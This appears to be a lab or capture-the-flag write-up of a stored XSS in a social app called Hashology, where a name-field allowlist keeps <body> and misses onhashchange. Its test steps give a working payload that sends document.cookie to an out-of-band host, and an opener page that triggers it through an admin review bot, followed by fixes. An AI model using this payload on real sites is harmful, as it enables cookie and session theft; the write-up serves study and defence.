# Hashology Body onhashchange Allowlist XSS

## What Is Happening

Hashology is a small social app. Users edit firstname, lastname, and bio, then can submit a ticket with a **URL to Review**. An admin bot visits that URL.

The about text hints that some tags are allowlisted. Firstname is the interesting field: it keeps raw `<body>...</body>` while stripping most event handlers. One handler survives: `onhashchange`.

## Why It Happens

The firstname sanitizer is an incomplete HTML allowlist:

- Allows `<body>`
- Strips common handlers (`onload`, `onclick`, `onerror`, `onfocus`, …)
- Does **not** strip `onhashchange`

The profile page also has a harmless stub:

```js
window.addEventListener('hashchange', (e) => {
  console.log('Hash changed to:', location.hash);
});
```

That stub is a red herring (no jQuery `$()` sink). The real sink is the stored attribute handler on the allowlisted `<body>` element.

`onhashchange` only fires when the fragment changes, so a second step is required: open the profile, then set `#...` from an attacker-controlled page the bot visits.

## Exact Test

1. Register/login.
2. Set firstname to:

```html
<body onhashchange="new Image().src='https://[oast]/c?'+encodeURIComponent(document.cookie)">X</body>
```

3. Confirm the attribute is present in `/profile/[you]` HTML source.
4. Host:

```html
<!doctype html>
<script>
const lab = 'https://[host]/profile/[you]';
const w = window.open(lab);
setTimeout(() => { w.location = lab + '#pwn'; }, 2500);
</script>
```

5. Submit that host URL via `/ticket`.

## Expected Signal

- Firstname HTML contains `<body onhashchange="...">`.
- Bot hits the external page (`/start` or similar on OAST).
- After hash set, OAST receives `/c?flag=...` (or other non-HttpOnly cookies).
- `connect.sid` may be HttpOnly and absent from `document.cookie`; the lab flag cookie was JS-readable.

## Result Interpretation

Confirmed chain:

```text
firstname allowlist keeps <body>
-> onhashchange not stripped
-> ticket bot visits external opener
-> window.open(profile) + hash change
-> handler runs on lab origin
-> document.cookie exfil
```

## Root Cause

Allowlist sanitizer permits a document-level element (`body`) and misses an uncommon event handler. Delivery uses the admin review bot plus a same-profile hash change.

## Impact

- Stored XSS in any viewer of the attacker profile who can be induced to change the hash.
- Admin bot compromise and theft of non-HttpOnly cookies (including the lab flag cookie).

## Fix

- Do not allow `body`/`html`/`head` in user HTML.
- Strip all attributes matching `/^on/i`.
- Prefer context-aware encoding for profile text fields.
- Mark secret cookies HttpOnly.

## Related Files

- `labs/2026-07-10-hashology-body-onhashchange-allowlist-xss.md`
- `notes/html-allowlist-body-onhashchange-xss.md`
- `payloads/xss/body-onhashchange-allowlist-bot.md`
